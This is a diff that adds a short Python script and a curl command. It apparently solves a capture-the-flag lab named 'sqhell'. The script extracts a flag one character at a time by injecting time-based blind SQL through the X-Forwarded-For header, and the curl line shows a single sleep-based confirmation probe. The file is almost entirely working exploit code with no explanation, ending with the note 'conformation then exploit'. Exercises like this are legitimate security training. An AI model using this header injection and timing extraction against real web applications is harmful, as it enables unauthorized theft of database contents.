@@ -1,0 +1,25 @@
+```
+import requests
+import time
+import string
+
+server = "sqhell.thm" # IP OR SERVERNAME IF IN HOST FILE
+flag = ""
+loop = 1
+
+while chr(125) not in flag:
+    for a in range(48,126):
+        start = time.time()
+        r = requests.get(url="http://" + server, headers={'X-Forwarded-For':f"1' AND (SELECT sleep(2) FROM flag where (ASCII(SUBSTR(flag,{loop},1))) = '{a}'); --+"})
+        end = time.time()
+        if end-start >= 2:
+            flag += chr(a)
+            loop += 1
+            print("Finding Flag: ", flag, end="\r")
+            break
+print("Flag found: ", flag)
+```
+
+curl -H "X-Forwarded-For:1' AND (SELECT sleep(5) FROM flag where (ASCII(SUBSTR(flag,2,1))) = '72'); --+" http://sqhell.thm
+
+conformation then exploit
